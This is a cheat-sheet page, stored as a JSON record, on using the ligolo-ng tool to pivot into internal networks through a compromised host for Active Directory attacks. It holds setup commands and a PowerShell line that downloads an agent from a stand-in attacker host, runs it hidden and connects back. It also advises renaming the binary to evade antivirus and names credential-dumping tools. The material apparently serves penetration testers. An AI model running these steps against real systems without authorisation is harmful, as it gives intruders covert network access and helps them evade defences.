{"title": "ligolo-ng", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/ref-pivoting-ligolo-ng", "html": "<h1 id=\"pivoting-ligolo-ng\">ligolo-ng</h1>\n<p>&gt; L3 tunnel — full network access through compromised host. Use when you need Kerberos auth or full TCP/UDP to internal networks. Better than chisel SOCKS for AD attacks.</p>\n<h3>Setup (exegol/Linux)</h3>\n<pre><code class=\"language-bash\"># Create TUN interface\nip tuntap add user root mode tun ligolo\nip link set ligolo up\nip route add &lt;target-ip&gt;/24 dev ligolo\n\n# Start proxy\nligolo-ng -selfcert -laddr 0.0.0.0:11601 -daemon</code></pre>\n<h3>Agent (Windows target)</h3>\n<pre><code class=\"language-powershell\">Invoke-WebRequest -Uri &quot;http://ATTACKER:8080/agent.exe&quot; -OutFile &quot;C:\\Users\\Public\\agent.exe&quot;\nStart-Process &quot;C:\\Users\\Public\\agent.exe&quot; -ArgumentList &quot;-connect&quot;,&quot;ATTACKER:11601&quot;,&quot;-ignore-cert&quot; -WindowStyle Hidden</code></pre>\n<h3>Agent (Linux target)</h3>\n<pre><code class=\"language-bash\">./agent -connect ATTACKER:11601 -ignore-cert &amp;</code></pre>\n<h3>Config File (/root/.ligolo-proxy/ligolo-ng.yaml)</h3>\n<pre><code class=\"language-yaml\">web:\n    enabled: true\n    listen: 127.0.0.1:8080\nagent:\n    &quot;*&quot;:\n        autobind: true\n        interface: ligolo\ninterface:\n    ligolo:\n        routes:\n            - &lt;target-ip&gt;/24</code></pre>\n<h3>Advantages over Chisel</h3>\n<p>- Full L3 tunnel — Kerberos, DNS, ICMP all work natively - No proxychains needed — tools connect directly to internal IPs - Better for AD attacks (secretsdump, psexec with Kerberos)</p>\n<h3>Common Issues</h3>\n<p>- Agent may be killed by AV — rename the binary - Daemon mode needs web.enabled=true in config for autobind - Route must match internal subnet</p>", "excerpt": "ligolo-ng &gt; L3 tunnel — full network access through compromised host. Use when you need Kerberos auth or full TCP/UDP to internal networks. Better than chisel SOCKS for AD attacks. Setup (exegol/Li…", "tags": ["reference", "pivoting"]}